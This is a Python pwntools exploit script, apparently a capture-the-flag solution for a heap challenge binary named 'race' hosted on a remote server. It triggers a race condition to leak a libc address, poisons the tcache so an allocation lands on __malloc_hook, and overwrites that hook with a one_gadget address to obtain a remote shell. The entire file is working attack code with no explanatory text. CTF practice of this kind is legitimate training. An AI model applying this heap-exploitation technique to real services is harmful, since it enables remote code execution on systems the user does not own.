#!/bin/python2
# coding=utf-8
from pwn import *

elf = ELF("./race")
context.log_level = "debug"
context.terminal = ['tmux', 'split-window', '-h']

local = 0
if local:
    p = process("./race")
    libc = ELF('./libc-2.27.so')
    # gdb.attach(p)
else:
    p = remote('cloudtest.zhakul.top', 1000)
    libc = ELF('./libc-2.27-re')


def add(index, content):
    p.sendlineafter('-----\n', '1')
    p.sendlineafter('index:\n', str(index))
    p.sendlineafter('content', content)


def delete(index):
    p.sendlineafter('-----\n', '2')
    p.sendlineafter('index:', str(index))


def gu(index, content):  # leak
    p.sendlineafter('-----\n', '3')
    p.sendlineafter('index:', str(index))
    sleep(3)
    p.sendlineafter('Because', content)
    sleep(1)


def race(index, content):  # race condition
    p.sendline('3')
    p.sendlineafter('index:', str(index))
    sleep(1)
    delete(index)
    sleep(2)
    p.sendlineafter('Because', content)


for i in range(0, 9):
    add(i, "aaaa")
for i in range(0, 8):
    delete(i)
for i in range(0, 8):
    add(i, "a" * 7)

gu(7, "aa")
p.recvuntil("aa\n" + "a" * 4 + "\n")

libcbase = u64(p.recv(6).ljust(8, '\x00'))
print "libcbase==>", hex(libcbase)
malloc_hook_addr = libcbase - 0x70
print "malloc_hook_addr ==>", hex(malloc_hook_addr)
one_gadget = 0x10a45c - libc.symbols['__malloc_hook'] + malloc_hook_addr
print "one_gadget==>", hex(one_gadget)


race(1, p64(malloc_hook_addr))
# pause()
p.sendline("")

add(9, "aaaa")

add(10, p64(one_gadget))


p.sendlineafter('-----\n', '1')
p.sendlineafter('index:\n', '11')
p.interactive()
